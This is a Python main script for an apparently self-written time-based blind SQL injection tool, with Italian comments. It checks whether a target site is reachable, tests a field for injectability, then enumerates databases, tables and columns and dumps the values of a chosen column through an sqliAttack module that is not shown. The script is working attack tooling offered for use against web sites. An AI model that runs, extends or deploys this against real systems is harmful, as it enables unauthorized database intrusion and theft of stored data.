#libreria per semplificare i paramentri da linea
import  getopt
import OptionConfiguration
import sys
import parseOptions
import sqliAttack
import urllib

def main():
    parseOptions.parseOptions(sys.argv[1:])
    #aggiungere controllo se il sito e raggiungibile o meno
    import requests
    try:
        request = requests.get(OptionConfiguration.destination[0])
    except:
        print (OptionConfiguration.bcolors.BOLD+OptionConfiguration.bcolors.FAIL+"Page %s no available"%(OptionConfiguration.destination)+OptionConfiguration.bcolors.ENDC)
        sys.exit(0)

    if(sqliAttack.checkVariableInjectable()):
        print(OptionConfiguration.bcolors.BOLD+"Field '%s' appear injectable on Time-Based Blind SQLi (%s)"%(OptionConfiguration.valueInjectable,OptionConfiguration.typeOfValue)+OptionConfiguration.bcolors.ENDC)
        print(OptionConfiguration.bcolors.BOLD+OptionConfiguration.bcolors.FAIL+"Please don't use the network for greater accuracy"+OptionConfiguration.bcolors.ENDC)


        # ricerca in base al tipo di attacco
        if(OptionConfiguration.typeOfAttack=="d"):
            print ("Search all db")
            sqliAttack.searchNameAlldb()

        elif(OptionConfiguration.typeOfAttack=="t"):
            if(OptionConfiguration.nameDb!=""):
                print ("Search all table of %s")%(OptionConfiguration.nameDb)
                sqliAttack.searchAllTableName(OptionConfiguration.nameDb)
            else:
                print(OptionConfiguration.bcolors.FAIL+"Please insert a db name"+OptionConfiguration.bcolors.ENDC)

        elif(OptionConfiguration.typeOfAttack=="c"):
            if(OptionConfiguration.nameTable!=""):
                print ("Search all column of %s")%(OptionConfiguration.nameTable)
                sqliAttack.searchAllColumnOfTable(OptionConfiguration.nameTable)
            else:
                print (OptionConfiguration.bcolors.FAIL+"Insert a table name"+OptionConfiguration.bcolors.ENDC)
            # sqliAttack.searchAllColumnOfTable(OptionConfiguration.nameTable)

        elif(OptionConfiguration.typeOfAttack=="a"):

            if(OptionConfiguration.nameColumn!="" and OptionConfiguration.nameTable!="" and OptionConfiguration.nameDb!="" ):

                print ("Search all value of column %s")%(OptionConfiguration.nameColumn)
                sqliAttack.searchAllValueOfColumn(OptionConfiguration.nameColumn, OptionConfiguration.nameTable,
                                              OptionConfiguration.nameDb)
            else:

                print (OptionConfiguration.bcolors.FAIL+"Insert a column name,table name and db name"+OptionConfiguration.bcolors.ENDC)
                parseOptions.help()
        else:
            print (OptionConfiguration.bcolors.FAIL+OptionConfiguration.bcolors.BOLD+"Errore "+OptionConfiguration.bcolors.ENDC)
    else:
        print(OptionConfiguration.bcolors.BOLD+OptionConfiguration.bcolors.FAIL+"The web site appears secure "+OptionConfiguration.bcolors.ENDC)



if __name__=="__main__":
    main()